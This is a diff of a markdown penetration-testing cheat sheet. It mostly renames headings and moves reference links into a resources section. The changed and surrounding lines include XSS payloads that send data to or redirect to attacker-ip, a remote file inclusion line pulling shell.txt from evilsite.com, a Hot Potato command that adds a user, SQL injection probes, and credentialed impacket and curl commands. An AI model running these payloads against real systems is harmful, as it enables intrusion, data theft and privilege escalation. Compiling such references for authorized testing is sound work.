@@ -91,7 +91,7 @@
 - tactics: enumeration
 - suites: impacket
 
-## dump informations via rpc
+## dump rpc endpoints
 - `/opt/impacket/examples/rpcdump.py username:password@target-ip`
 
 ---
@@ -335,9 +335,6 @@ Connection: close
 - tactics: inital_access
 - tactics: exfiltration
 
-## external resource
-[sql-injection](http://securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html)
-
 ## check if you can find a row, where you can place your output  
 - `http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8`
 
@@ -376,7 +373,7 @@ Connection: close
 - tactics: exfiltration
 
 ## download emails via curl
-`curl --insecure --url "imaps://target-domain/Drafts;UID=4" --user "username:password"`
+- `curl --insecure --url "imaps://target-domain/Drafts;UID=4" --user "username:password"`
 
 ## bypass useragent blacklisting
 - `curl -A "Googlebot" http://target-ip/robots.txt`
@@ -553,8 +550,8 @@ Login failed!"`
 - `'">><script>new Image().src="attacker-ip:81/bogus.php?output="+navigator.platform;</script>`
 
 ## xss redirect to own webserver
-- `'">><script>document.location="http://attacker-ip:8080";</script>`
-- `'">><script>window.location="http://attacker-ip/rev.html";</script>`
+- `'">><script>document.location="http://attacker-ip:81";</script>`
+- `'">><script>window.location="http://attacker-ip:81";</script>`
 
 ---
 
@@ -562,9 +559,6 @@ Login failed!"`
 - service: http
 - service: php
 - tactics: inital_access
-
-## external ressources
-- [file-inclusion](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/)
 
 ## including remote code
 - `?file=[http|https|ftp]://evilsite.com/shell.txt`
@@ -731,9 +725,6 @@ Login failed!"`
 - service: kerberos
 - tactics: lateral_movement
 
-## external ressources
-[mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)
-
 ## enable log
 - `log filename.log`
 
@@ -838,7 +829,7 @@ Login failed!"`
 ---
 
 # psexec.exe
-- service: rpc
+- service: smb
 - tactics: inital_access
 - suites: pstools
 
@@ -865,6 +856,8 @@ Login failed!"`
 
 ## static application
 > To compile static applications use the “-static” parameter additionally
+
+## skelleton c code which calls system()
 
 ```
 #include <stdlib.h>
@@ -969,8 +962,8 @@ return 0;
 
 # potato.exe
 
-# Hot Potato usage
-- `Potato.exe -ip <local ip> -cmd "c:\\windows\\system32\\cmd.exe /K net users username password /add" -disable_exhaust true`
+## hot potato usage
+- `potato.exe -ip <local ip> -cmd "c:\\windows\\system32\\cmd.exe /K net users username password /add" -disable_exhaust true`
 
 ---
 
@@ -1129,11 +1122,17 @@ term.cmdloop()
 ### pivoting
 [https://www.ivoidwarranties.tech](https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/proxychains)
 
+### mimikatz
+[mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)
+
 ### upgrade shell to meterpreter and bypass applocker
 [https://mlcsec.com](https://mlcsec.com/shell-upgrade-cheat-sheet/#msbuildexe)
 
 ### powershell
 [https://burmat.gitbook.io](https://burmat.gitbook.io/security/hacking/one-liners-and-dirty-scripts)
+
+### SQLi
+[http://securityidiots.com](http://securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html)
 
 ### LFI / RFI
 [https://websec.wordpress.com](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/)
